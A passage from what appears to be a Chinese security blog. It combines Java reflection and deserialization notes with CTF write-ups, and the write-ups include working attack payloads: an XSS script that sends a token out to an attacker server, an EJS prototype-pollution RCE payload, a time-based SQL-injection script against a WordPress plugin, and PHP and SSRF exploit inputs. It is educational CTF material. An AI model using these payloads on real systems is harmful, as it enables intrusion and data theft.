&#x2F;&#x2F; 反射获取Runtime类的exec方法 Method m2 &#x3D; c.getMethod(new String(new byte[]&#123;101, 120, 101, 99&#125;), String[].class); &#x2F;&#x2F; 反射调用Runtime.getRuntime().exec(xxx)方法 Process obj2 &#x3D; (Process)m2.invoke(m1.invoke(null), (Object) str); &#x2F;&#x2F; &#x2F;&#x2F; 反射获取Process类的getInputStream方法 &#x2F;&#x2F; 反射获取Process类的getInputStream方法 等价于Method m &#x3D; obj2.getClass().getMethod(&quot;getInputStream&quot;); Method m &#x3D; obj2.getClass().getMethod(new String(new byte[]&#123;103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109&#125;)); m.setAccessible(true); &#x2F;&#x2F; &#x2F;&#x2F; &#x2F;&#x2F; 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串 Scanner s &#x3D; new Scanner((InputStream) m.invoke(obj2, new Object[]&#123;&#125;),&quot;GBK&quot;); while (s.hasNext())&#123; System.out.println(s.next()); &#125; 还可以使用ProcessBuilder或UNIXProcess/ProcessImpl执行命令 总结总结一下常用方法 &#x2F;&#x2F;获取包名、类名 clazz.getPackage().getName()&#x2F;&#x2F;包名 clazz.getSimpleName()&#x2F;&#x2F;类名 clazz.getName()&#x2F;&#x2F;完整类名 &#x2F;&#x2F;获取成员变量定义信息 getFields()&#x2F;&#x2F;获取所有公开的成员变量,包括继承变量 getDeclaredFields()&#x2F;&#x2F;获取本类定义的成员变量,包括私有,但不包括继承的变量 getField(变量名) getDeclaredField(变量名) &#x2F;&#x2F;获取构造方法定义信息 getConstructor(参数类型列表)&#x2F;&#x2F;获取公开的构造方法 getConstructors()&#x2F;&#x2F;获取所有的公开的构造方法 getDeclaredConstructors()&#x2F;&#x2F;获取所有的构造方法,包括私有 getDeclaredConstructor(int.class,String.class) &#x2F;&#x2F;获取方法定义信息 getMethods()&#x2F;&#x2F;获取所有可见的方法,包括继承的方法 getMethod(方法名,参数类型列表) getDeclaredMethods()&#x2F;&#x2F;获取本类定义的的方法,包括私有,不包括继承的方法 getDeclaredMethod(方法名,int.class,String.class) &#x2F;&#x2F;反射新建实例 clazz.newInstance();&#x2F;&#x2F;执行无参构造创建对象 clazz.newInstance(222,&quot;韦小宝&quot;);&#x2F;&#x2F;执行有参构造创建对象 clazz.getConstructor(int.class,String.class)&#x2F;&#x2F;获取构造方法 &#x2F;&#x2F;反射调用成员变量 clazz.getDeclaredField(变量名);&#x2F;&#x2F;获取变量 clazz.setAccessible(true);&#x2F;&#x2F;使私有成员允许访问 f.set(实例,值);&#x2F;&#x2F;为指定实例的变量赋值,静态变量,第一参数给null f.get(实例);&#x2F;&#x2F;访问指定实例变量的值,静态变量,第一参数给null &#x2F;&#x2F;反射调用成员方法 Method m &#x3D; Clazz.getDeclaredMethod(方法名,参数类型列表); m.setAccessible(true);&#x2F;&#x2F;使私有方法允许被调用 m.invoke(实例,参数数据);&#x2F;&#x2F;让指定实例来执行该方法 Java反序列化 java的序列化机制就是为了持久化存储某个对象或者在网络上传输某个对象。我们都知道，一旦jvm关闭，那么java中的对象也就销毁了，所以要想保存它，就需要把他转换为字节序列写到某个文件或是其它哪里。 Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。即序列化是指把一个Java对象变成二进制内容，本质上就是一个byte[]数组。 为什么要把Java对象序列化呢？因为序列化后可以把byte[]保存到文件中，或者把byte[]通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。 将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，即把一个二进制内容（也就是byte[]数组）变回Java对象。有了反序列化，保存到文件中的byte[]数组又可以“变回”Java对象，或者从网络上读取byte[]并把它“变回”Java对象。也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。 整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。 Java的序列化机制仅适用于Java，如果需要与其它语言交换数据，必须使用通用的序列化方法，例如JSON。 java对象实现序列化的前提是必须实现一个特殊的java.io.Serializable接口 这个接口没有定义任何方法，只是一个空接口，也被叫做&quot;标记接口&quot;，实现了标记接口的类仅仅是给自身贴了个“标记”，并没有增加任何方法。 就像php中有serialize和unserialize函数负责序列化和反序列化一样，Java也有writeObject和readObject负责序列化和反序列化，他们分别属于ObjectInputStream 和 ObjectOutputStream 这两个高层次的数据流 静态成员变量不能被序列化，序列化是针对对象属性的，而静态变量属于类 transient标识的对象成员变量不参与序列化 具体实现序列化步骤： 把对象转换为字节序列 步骤一：创建一个ObjectOutputStream输出流 步骤二：调用ObjectOutputStream对象的writeObject输出可序列化对象。 反序列化步骤 把字节序列转换为对象 步骤一：创建一个ObjectInputStream输入流； 步骤二：调用ObjectInputStream对象的readObject()得到序列化的对象。 代码实现 package serializTest; import java.io.*; import java.nio.file.Files; import java.nio.file.Path; import java.nio.file.Paths; public class Run &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; SerializeDemo serializeDemo &#x3D; new SerializeDemo(); serializeDemo.x &#x3D; 123; Path path &#x3D; Paths.get(&quot;1.ser&quot;); &#x2F;&#x2F;序列化 &#x2F;&#x2F; 创建一个FileOutputStream，且将这个FileOutputStream封装到ObjectOutputStream中 ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(Files.newOutputStream(path)); &#x2F;&#x2F; 调用writeObject方法，序列化对象到文件1.ser中 objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); &#x2F;&#x2F;反序列化 &#x2F;&#x2F; 创建一个FIleInutputStream，并将FileInputStream封装到ObjectInputStream中 ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(Files.newInputStream(path)); &#x2F;&#x2F; 调用readObject从1.ser中反序列化出对象，还需要进行一下类型转换，默认是Object类型 SerializeDemo serializeDemo1 &#x3D; (SerializeDemo) objectInputStream.readObject(); System.out.println(serializeDemo1.add(1,2)); &#125; &#125; class SerializeDemo implements Serializable &#123; &#x2F;&#x2F; 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b)&#123; return a+b+x; &#125; &#125; 输出可以看出x的值是序列化之前的123，也就是通过序列化存储的信息可以重新通过反序列化得到恢复 序列化后的内容是无法正常查看的 但是我们可以在十六进制的内容中得到一点信息，比如前八位中 AC ED：STREAM_MAGIC，声明使用了序列化协议，从这里可以判断保存的内容是否为序列化数据。 （这是在黑盒挖掘反序列化漏洞很重要的一个点） 00 05：STREAM_VERSION，序列化协议版本。 也可以存到 bytes数组中 package serializTest; import java.io.*; import java.nio.file.Files; import java.nio.file.Path; import java.nio.file.Paths; import java.util.Arrays; public class Run &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; SerializeDemo serializeDemo &#x3D; new SerializeDemo(); serializeDemo.x &#x3D; 666; &#x2F;&#x2F; 序列化 ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream(); &#x2F;&#x2F; 本体 ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream); &#x2F;&#x2F; 只是一个装饰器的作用 Filter模式 objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); &#x2F;&#x2F; 反序列化 ByteArrayInputStream byteArrayInputStream &#x3D; new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(byteArrayInputStream); SerializeDemo serializeDemo1 &#x3D; (SerializeDemo)objectInputStream.readObject(); objectInputStream.close(); System.out.println(serializeDemo1.add(1, 2)); &#125; &#125; class SerializeDemo implements Serializable &#123; &#x2F;&#x2F; 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b)&#123; return a+b+x; &#125; &#125; 反序列化的安全问题我们看到反序列化可以恢复序列化时对属性的赋值，那如果我们构造一个恶意的序列化文件替换掉系统自动生成的序列化文件，或者直接在反序列化的位置上传一个构造好的恶意byte数组，就会让系统中出现我们构造的内容，从而造成一些安全漏洞 实际上，Java本身提供的基于对象的序列化和反序列化机制既存在安全性问题，也存在兼容性问题。更好的序列化方法是通过JSON这样的通用数据结构来实现，只输出基本类型（包括String）的内容，而不存储任何与代码相关的信息。 ​ 同时，为了能够更加灵活的传输内容，Java允许用户进行重写 writeObject和readObject方法。也就是说，如果服务端反序列化数据，客户端传递的类中的readObject方法中的代码就会执行，让攻击者可以在服务器上运行自己的代码 在调用readObject方法时会执行到ObjectStreamClass类里的invokeReadObject方法，里面通过反射调用了客户端传递的类中的readObject方法 其中obj就是我们传入的类，而readObjectMethod属性通过反射成为了传递的类的readObject方法 in就是我们序列化后的内容 所以假设我们传递的类是AnnotationInvocationHandler类，那么readObjectMethod.invoke(obj, new Object[]{ in });实质上等价于 sun.reflect.annotation.AnnotationInvocationHandler.readObject.invoke(AnnotationInvocationHandler,new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)))) 可能的形式1.入口类的readObject直接调用危险方法 我在SerializeDemo类中加入一个readObject类，其余部分不变，再次执行程序 private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ois.defaultReadObject(); Runtime.getRuntime().exec(&quot;calc&quot;); &#125; 2.入口类参数中包含可控类，该类有危险方法，readObject时调用 3.入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用 4.构造函数/静态代码块等类加载时隐性执行 流程共同条件 继承Serializable 入口类 source （需要重写readObject方法，参数类型宽泛，最好jdk自带）（Map） 调用链 gadget chain 执行类 sink 代理关于代理首先需要了解代理模式，根据代理类的创建时间又可以分为静态代理和动态代理。 代理模式定义：为其他对象提供一种代理以控制对这个对象的访问 代理模式的通用类图 上图中，Subject是一个抽象类或者接口，RealSubject是实现方法类，具体的业务执行，Proxy则是RealSubject的代理，直接和client接触的。 代理模式可以在不修改被代理对象的基础上，通过扩展代理类，进行一些功能的附加与增强。值得注意的是，代理类和被代理类应该共同实现一个接口，或者是共同继承某个类。 优点职责清晰 在不更改原类的基础上扩展功能 静态代理代理模式是在不修改目标对象(被代理对象)的基础上，通过代理对象（扩展代理类)，进行一些功能的附加与增强——&gt;静态代理是在不改变源代码的基础上增加新的功能。 特点 （1）静态代理要求目标对象和代理对象实现同一个业务接口。代理对象中的核心功能是由目标对象来完成，代理对象负责增强功能。 （2）目标对象(被代理对象)必须实现接口。 （3）代理对象在程序运行前就已经存在——&gt;扩展代理类Agent。 （4）支持目标对象灵活的切换，无法对功能灵活的处理——&gt;动态代理可解决此问题。 例子 &#x2F;&#x2F; Iuser接口 public interface Iuser &#123; void show(); &#125; &#x2F;&#x2F; 代理类 public class UserProxy implements Iuser&#123; Iuser user; public UserProxy(User user) &#123; this.user &#x3D; user; &#125; @Override public void show() &#123; user.show(); System.out.println(&quot;proxy&quot;); &#125; &#125; &#x2F;&#x2F; 实现类 public class User implements Iuser&#123; @Override public void show() &#123; System.out.println(&quot;user&quot;); &#125; &#125; &#x2F;&#x2F; 测试类 public class ProxyTest &#123; public static void main(String[] args) &#123; User user &#x3D; new User(); &#x2F;&#x2F; user.show(); &#x2F;&#x2F;假如静态代理，就需要下面这种写法 UserProxy userProxy &#x3D; new UserProxy(user); userProxy.show(); &#125; &#125; 从上边的例子应该也不难看出，静态代理存在一些缺陷 代理复杂，难于管理 ​ 代理类和目标类实现了相同的接口，每个代理都需要实现目标类的方法，这样就出现了大量的代码重复。如果接口增加一个方法，除了所有目标类需要实现这个方法外，所有代理类也需要实现此方法。——&gt;增加了代码维护的复杂度。 代理类依赖目标类+代理类过多 ​ 代理类只服务于一种类型的目标类，如果要服务多个类型。势必要为每一种目标类都进行代理，静态代理在程序规模稍大时就无法胜任了，代理类数量过多。 静态代理只适合业务功能固定不变的情况。(业务接口方法不进行增加和减少，实现类就不需要改动) 动态代理相比于静态代理来说，动态代理更加灵活。不需要针对每个目标类都单独创建一个代理类，并且也不需要实现接口直接代理实现类。动态代理类的字节码在程序运行时，运用反射机制动态创建而成。 动态代理在日志、监控、事务中，主流框架中都有着广泛的应用。动态代理一般有两种实现方式： JDK动态代理：利用接口实现代理 CGLIB动态代理：利用继承的方式实现代理 JDK动态代理JDK的动态代理是通过实现接口的方式 主要涉及java.lang.reflect包下的Proxy类和InvocationHandler接口，通过这个类和这个接口可以生成JDK动态代理类和动态代理对象。 创建过程首先通过Proxy.newProxyInstance创建代理类对象 这里要传入三个参数，分别是一个类加载器、我们要代理的接口以及一个InvocationHandler对象 ，其中InvocationHandler对象负责的是我们要做的事 这里主要说一下第三个参数 InvocationHandler 是一个接口，每个代理的实例都有一个与之关联的 InvocationHandler 实现类，如果代理的方法被调用，那么代理便会通知和转发给内部的 InvocationHandler 实现类，由它决定处理。 要有一个InvocationHandler的对象，肯定是先需要去实现这个接口 这个接口自身只有一个invoke方法 其中的三个参数 这里proxy和method都是系统负责获取的，最后一个参数对象数组就是我们真正要代理的对象，这里可以先定义这个对象然后通过构造函数给它赋值 import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class UserInvocationHandler implements InvocationHandler &#123; Iuser user; public UserInvocationHandler(Iuser iuser)&#123; this.user &#x3D; iuser; &#125; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; &#x2F;&#x2F; 无论外部传入什么，都会捕获到，然后作为method传入 method.invoke(user,args); return null; &#125; &#125; 此时在测试类里，我们需要创建一个UserInvocationHandler的对象，需要的参数就是我们实际上操作的user对象。 创建完成后，Proxy.newProxyInstance所需要的三个参数我们便准备完成了，之后再进行传参然后再将返回值强制类型转换就可以了。 这时候就可以通过转换类型后的返回值来操控user类中的方法了。 我们对o传入的方法都会被UserInvocationHandler捕获，然后作为method参数，以反射的方式去调用。 动态代理不需要单独创建代理类，但是需要创建一个实现InvocationHandler接口的调用处理程序类 总结 静态代理，代理类需要自己编写代码写成。 动态代理，代理类通过 Proxy.newInstance() 方法生成。 JDK实现的代理中不管是静态代理还是动态代理，代理与被代理者都要实现两样接口，它们的实质是面向接口编程。CGLib可以不需要接口。 动态代理通过 Proxy 动态生成 proxy class，但是它也指定了一个 InvocationHandler 的实现类。 JavassistJavassist是一个开源的分析、编辑和创建Java字节码的类库。是由东京工业大学的数学和计算机科学系的 Shigeru Chiba （千叶 滋所创建的。它已加入了开放源代码JBoss 应用服务器项目 通过javasssit，我们可以： 动态创建新类或新接口的二进制字节码 动态扩展现有类或接口的二进制字节码(AOP) Javassist中最为重要的是ClassPool，CtClass ，CtMethod 以及 CtField这几个类。 ClassPool：一个基于HashMap实现的CtClass对象容器，其中键是类名称，值是表示该类的CtClass对象。默认的ClassPool使用与底层JVM相同的类路径，因此在某些情况下，可能需要向ClassPool添加类路径或类字节。 CtClass：表示一个类，这些CtClass对象可以从ClassPool获得。 CtMethods：表示类中的方法。 CtFields ：表示类中的字段。","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"Java","slug":"Java","permalink":"https://ethe448.github.io/tags/Java/"}]},{"title":"HGAME2023 wp","slug":"HGAME2023-wp","date":"2023-02-06T14:18:08.000Z","updated":"2023-02-07T14:52:53.514Z","comments":true,"path":"2023/02/06/HGAME2023-wp/","link":"","permalink":"https://ethe448.github.io/2023/02/06/HGAME2023-wp/","excerpt":"","text":"v2board 题目描述：请尝试获取Admin用户的订阅链接，flag格式为hgame{admin用户订阅链接中的token值}。 Designerxss注入的题 首先要拿到flag就要求注册的时候post的数据为admin，而且还要是本地的ip，修改xff无果 给的源码里的share的部分，就是在本地访问preview这个路由里的内容 之后在preview里，过滤了一些xss的关键数据，从这里也能看出这道题就是利用xss，让本地访问的那个机器人去访问register路由，然后把得到的内容外带出来。 接下来就是找从哪里进行xss。 在preview.ejs中 使用了&lt;%-，这个和&lt;%=的区别就是不会进行html的实体编码，也就可以进行xss的操作 这里进行过滤的时候只将值清空了，但是并没有改变键，所以可以这样进行xss 接下来就是让其访问register路由了 var xhr = new XMLHttpRequest(); xhr.open(\"post\",'http://127.0.0.1:9090/user/register',false); xhr.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); data = &#123;\"username\":\"admin\"&#125;; xhr.send(JSON.stringify(data)); h = String(xhr.responseText); url = \"http://xxx:5001?token=\"+h; var xhr2 = new XMLHttpRequest(); xhr2.open(\"get\",url,false); xhr2.send('token'); 放到服务器上然后让题目本地的机器人去访问服务器上的这个文件，就会执行里面的js代码，访问本地的9090端口下的/user/register，然后把返回的内容以参数的形式发送到服务器上 作为键或者作为值都行，因为并没有被过滤的关键字 Gopher Shop 题目描述:今天是大年初二！兔兔迈着开心的步伐走到了一教，据说每逢寒假HGAME期间，300b就会有Vidar大商场，每个进入商场的同学都可以领取10个Vidar币。兔兔在一家叫Gopher Shop的商店面前停下了脚步，Gopher？听说协会的Web手们都会一点Go,也许这是协会学长开的吧。望着橱窗里的商品，攥着手里的10个Vidar币，兔兔走进了商店... 考察go语言uint类型的整数溢出问题 uint类型在64位机器上的最大值为18446744073709551615，最小值为0，超出的部分就会溢出 购买部分逻辑如下： 这里uint(number)*price就有可能导致溢出的产生 若购买1844674407370955162个苹果，与价格相乘后会变为18446744073709551620，导致溢出变为4（0，1，2，3，4实际上是溢出了五） 这时4小于我们原有的10硬币，就可以买到1844674407370955162个苹果，然后再卖出就可以有钱买flag了（卖的时候也要注意溢出 钱不够就多买几次再卖出去，这里前端显示的内容和实际的数量不一样，因为前端把后边的部分舍了。 Tell Me Just tell me your thoughts xxe的题目 标准的无回显xxe 在自己服务器上搭个恶意的dtd文件 然后在提交的时候外部引入这个文件 这里是直接报错把提交的内容显示出来了，如果没显示就在服务器上监听一下端口就行。 Shared Diary ek1ng给协会成员写了一个在线共享日记本，不论是谁只要知道密码，都可以在上面记录自己的小秘密。不过好像他的js学的并不好导致无意中引入了漏洞，看来js也有很多安全问题。 看见js第一时间想到的就应该是原型链污染 merge函数，存在原型链污染 但是这里__proto__被过滤了，可以使用.constructor.prototype来替代 这里表示能接收json类型的参数 这里我们先把角色污染为admin试一下 登陆成功，但是还是没有flag，根据给的源码可以猜测这里应该还需要利用一个ejs的漏洞才能拿到flag 两种方式，一种是ejs的模板注入，可以插⼊ &lt;%- %&gt; 标签来执⾏任意js，能够直接完成RCE。 还有一种就是借助原型链污染实现ejs的rce &#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;,&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;);&quot;&#125;&#125;,&quot;username&quot;:&quot;1&quot; 参考文章： https://www.anquanke.com/post/id/236354 https://blog.vvbbnn00.cn/archives/hgame2023week4-bu-fen-writeup","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"DASCTF X GFCTF wp","slug":"DASCTFxGFCTF wp","date":"2022-11-11T02:16:51.000Z","updated":"2023-02-07T14:51:58.165Z","comments":true,"path":"2022/11/11/DASCTFxGFCTF wp/","link":"","permalink":"https://ethe448.github.io/2022/11/11/DASCTFxGFCTF%20wp/","excerpt":"","text":"hade_waibo非预期就是先读start.sh文件，找到flag位置后读flag文件 预期解 #index.php &lt;?php error_reporting(0); session_start(); include &#39;class.php&#39;; if(isset($_POST[&#39;username&#39;]) &amp;&amp; $_POST[&#39;username&#39;]!&#x3D;&#39;&#39;)&#123; #修复了登录还需要passwd的漏洞 $user &#x3D; new User($_POST[&#39;username&#39;]); &#125; if($_SESSION[&#39;isLogin&#39;])&#123; die(&quot;&lt;script&gt;alert(&#39;Login success!&#39;);location.href&#x3D;&#39;file.php&#39;&lt;&#x2F;script&gt;&quot;); &#125;else&#123; die(&#39; &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;div class&#x3D;&quot;ui input&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&quot;Give me uname&quot; maxlength&#x3D;&quot;6&quot;&gt; &lt;&#x2F;div&gt; &lt;form&gt;&#39;); &#125; #class.php &lt;?php class User &#123; public $username; public function __construct($username)&#123; $this-&gt;username &#x3D; $username; $_SESSION[&#39;isLogin&#39;] &#x3D; True; $_SESSION[&#39;username&#39;] &#x3D; $username; &#125; public function __wakeup()&#123; $cklen &#x3D; strlen($_SESSION[&quot;username&quot;]); if ($cklen !&#x3D; 0 and $cklen &lt;&#x3D; 6) &#123; $this-&gt;username &#x3D; $_SESSION[&quot;username&quot;]; &#125; &#125; public function __destruct()&#123; if ($this-&gt;username &#x3D;&#x3D; &#39;&#39;) &#123; session_destroy(); &#125; &#125; &#125; class File &#123; #更新黑名单为白名单，更加的安全 public $white &#x3D; array(&quot;jpg&quot;,&quot;png&quot;); public function show($filename)&#123; echo &#39;&lt;div class&#x3D;&quot;ui action input&quot;&gt;&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;filename&quot; placeholder&#x3D;&quot;Search...&quot;&gt;&lt;button class&#x3D;&quot;ui button&quot; onclick&#x3D;&quot;window.location.href&#x3D;\\&#39;file.php?m&#x3D;show&amp;filename&#x3D;\\&#39;+document.getElementById(\\&#39;filename\\&#39;).value&quot;&gt;Search&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;&lt;p&gt;&#39;; if(empty($filename))&#123;die();&#125; return &#39;&lt;img src&#x3D;&quot;data:image&#x2F;png;base64,&#39;.base64_encode(file_get_contents($filename)).&#39;&quot; &#x2F;&gt;&#39;; &#125; public function upload($type)&#123; $filename &#x3D; &quot;dasctf&quot;.md5(time().$_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.$type&quot;; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload&#x2F;&quot; . $filename); return &quot;Upload success! Path: upload&#x2F;&quot; . $filename; &#125; public function rmfile()&#123; system(&#39;rm -rf &#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;*&#39;); &#125; public function check($type)&#123; if (!in_array($type,$this-&gt;white))&#123; return false; &#125; return true; &#125; &#125; #更新了一个恶意又有趣的Test类 class Test &#123; public $value; public function __destruct()&#123; chdir(&#39;.&#x2F;upload&#39;); $this-&gt;backdoor(); &#125; public function __wakeup()&#123; $this-&gt;value &#x3D; &quot;Don&#39;t make dream.Wake up plz!&quot;; &#125; public function __toString()&#123; $file &#x3D; substr($_GET[&#39;file&#39;],0,3); file_put_contents($file, &quot;Hack by $file !&quot;); return &#39;Unreachable! :)&#39;; &#125; public function backdoor()&#123; if(preg_match(&#39;&#x2F;[A-Za-z0-9?$@]+&#x2F;&#39;, $this-&gt;value))&#123; $this-&gt;value &#x3D; &#39;nono~&#39;; &#125; system($this-&gt;value); &#125; &#125; #file.php &lt;?php error_reporting(0); session_start(); include &#39;class.php&#39;; $file &#x3D; new file(); switch ($_GET[&#39;m&#39;]) &#123; case &#39;upload&#39;: if(empty($_FILES))&#123;die($form);&#125; $type &#x3D; end(explode(&quot;.&quot;, $_FILES[&#39;file&#39;][&#39;name&#39;])); if ($file-&gt;check($type)) &#123; die($file-&gt;upload($type)); &#125;else&#123; die(&#39;你食不食油饼🤬&#39;); &#125; break; case &#39;show&#39;: die($file-&gt;show($_GET[&#39;filename&#39;])); break; case &#39;rm&#39;: $file-&gt;rmfile(); die(&quot;全删干净了捏😋&quot;); break; case &#39;logout&#39;: session_destroy(); die(&quot;&lt;script&gt;alert(&#39;已退出登录&#39;);location.href&#x3D;&#39;index.php&#39;&lt;&#x2F;script&gt;&quot;); break; default: echo &#39;&lt;h2&gt;Halo! &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;&#x2F;h2&gt;&#39;; break; &#125; ?&gt;","categories":[],"tags":[]},{"title":"一些web题","slug":"一些web题","date":"2022-10-20T04:16:12.000Z","updated":"2023-02-07T14:51:58.170Z","comments":true,"path":"2022/10/20/一些web题/","link":"","permalink":"https://ethe448.github.io/2022/10/20/%E4%B8%80%E4%BA%9Bweb%E9%A2%98/","excerpt":"","text":"NSSRound#1basic_check 打开之后只有一行代码，这里需要用nikto扫一下 Nikto是一款开放源代码的、功能强大的WEB扫描评估软件，能对web服务器多种安全项目进行测试的扫描软件，能在230多种服务器上扫描出2600多种有潜在危险的文件、CGI及其他问题，它可以扫描指定主机的WEB类型、主机名、特定目录、COOKIE、特定CGI漏洞、返回主机允许的http模式等等。它也使用LibWhiske库，但通常比Whisker更新的更为频繁。Nikto是网管安全人员必备的WEB审计工具之一。 显示可以通过put直接上传文件，直接写马 HNCTF[Week1]Challenge__rce自增的rce，但是有一些特别的姿势 &lt;?php error_reporting(0); if (isset($_GET[&#39;hint&#39;])) &#123; highlight_file(__FILE__); &#125; if (isset($_POST[&#39;rce&#39;])) &#123; $rce &#x3D; $_POST[&#39;rce&#39;]; if (strlen($rce) &lt;&#x3D; 120) &#123; if (is_string($rce)) &#123; if (!preg_match(&quot;&#x2F;[!@#%^&amp;*:&#39;\\-&lt;?&gt;\\&quot;\\&#x2F;|&#96;a-zA-Z~\\\\\\\\]&#x2F;&quot;, $rce)) &#123; eval($rce); &#125; else &#123; echo(&quot;Are you hack me?&quot;); &#125; &#125; else &#123; echo &quot;I want string!&quot;; &#125; &#125; else &#123; echo &quot;too long!&quot;; &#125; &#125; 过滤了很多，只能用 $ _ () [] &#123;&#125; , . = + ; 和数字 0-9 以及其它非 A-Z a-iz 的 Unicode 字符。但是如果参考p牛博客里的自增rce姿势的话长度又会超出限制。题目的 hint 灵感来源于 ctfshow 七夕杯的 shellme_revenge, 那题用的是 php0/0=NAN和1/0=INF 的特性，但是需要 / 运算符参与。而这道题里是通过构造chr函数，然后再利用chr来构造$_GET，chr的每个字母都可以通过数组类型Array取出来。 $_&#x3D;([].¥)&#123;3&#125;;$_++;$_.&#x3D;++$_;$_++;$_++;$_++; $_++;$_++;$_.&#x3D;([].¥)&#123;2&#125;;$_&#x3D;_.$_(71).$_(69).$_(84);($$_&#123;0&#125;)($$_&#123;1&#125;); [WEEK2]ez_ssrfflag在flag.php下，要求本地登录，这里不是修改xff和referer头可以实现的，看index.php里的代码就能猜到是关于ssrf的题。看到fsockopen函数，然后我们可以控制ip，port和data，所以只要将ip设置为127.0.0.1，port=80，data为我们构造的http请求包，就可以实现本地登录 编码之后提交 host&#x3D;127.0.0.1&amp;port&#x3D;80&amp;data&#x3D;R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo%3d [WEEK2]easy_unser没啥好写的，就记住is_file不将伪协议当作文件，但highlight_file认为伪协议可以是文件就行了 [WEEK2]Ohmywordpresswordpress这里有两个插件 其中 simple-link-directory, 存在 sql 注入 https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210 payload curl &#39;http:&#x2F;&#x2F;example.com&#x2F;wp-admin&#x2F;admin-ajax.php&#39; --data &#39;action&#x3D;qcopd_upvote_action&amp;post_id&#x3D;(SELECT 3 FROM (SELECT SLEEP(5))enz)&#39; 后边就是sql时间盲注了 抄了个脚本 import requests import time url &#x3D; &#39;http:&#x2F;&#x2F;1.14.71.254:28504&#x2F;wp-admin&#x2F;admin-ajax.php&#39; dicts &#x3D; r&#39;NSSCTF&#123;-abcdef0123456789&#125;&#39; flag &#x3D; &#39;&#39; for i in range(1,99999): for s in dicts: payload &#x3D; &quot;(SELECT 3 FROM (SELECT if(ascii(substr((select group_concat(flag) from ctftraining.flag),&#123;&#125;,1))&#x3D;&#123;&#125;, sleep(5),0))enz)&quot;.format(i,ord(s)) start_time &#x3D; time.time() print(s) res &#x3D; requests.post(url,data&#x3D;&#123; &#39;action&#39;: &#39;qcopd_upvote_action&#39;, &#39;post_id&#39;: payload &#125;) stop_time &#x3D; time.time() if stop_time - start_time &gt;&#x3D; 5: flag +&#x3D; s print(&#39;FOUND!!!&#39;,flag) break [WEEK3]Fun_php","categories":[],"tags":[]},{"title":"NewStarCTF","slug":"NewStarCTF","date":"2022-09-25T14:34:27.000Z","updated":"2022-10-31T12:48:46.988Z","comments":true,"path":"2022/09/25/NewStarCTF/","link":"","permalink":"https://ethe448.github.io/2022/09/25/NewStarCTF/","excerpt":"","text":"WEEK1第一周web太简单不想写 WEEK2IncludeOne&lt;?php highlight_file(__FILE__); error_reporting(0); include(&quot;seed.php&quot;); &#x2F;&#x2F;mt_srand(*********); echo &quot;Hint: &quot;.mt_rand().&quot;&lt;br&gt;&quot;; if(isset($_POST[&#39;guess&#39;]) &amp;&amp; md5($_POST[&#39;guess&#39;]) &#x3D;&#x3D;&#x3D; md5(mt_rand()))&#123; if(!preg_match(&quot;&#x2F;base|\\.\\.&#x2F;i&quot;,$_GET[&#39;file&#39;]) &amp;&amp; preg_match(&quot;&#x2F;NewStar&#x2F;i&quot;,$_GET[&#39;file&#39;]) &amp;&amp; isset($_GET[&#39;file&#39;]))&#123; &#x2F;&#x2F;flag in &#96;flag.php&#96; include($_GET[&#39;file&#39;]); &#125;else&#123; echo &quot;Baby Hacker?&quot;; &#125; &#125;else&#123; echo &quot;No Hacker!&quot;; &#125; 先是个伪随机，然后绕过if判断 伪随机就直接爆种子然后挨个试就行 然后是绕过if，不让有base，还要有newstar，用伪协议就行。 PHP伪协议可以将某个文件或文件夹包含在其中 f12看见flag.php的内容，然后rot13解码。 UnserializeOne&lt;?php class Start&#123; public $name; public $func; public function __destruct() &#123; echo &quot;Welcome to NewStarCTF, &quot;.$this-&gt;name; &#125; public function __isset($var) &#123; 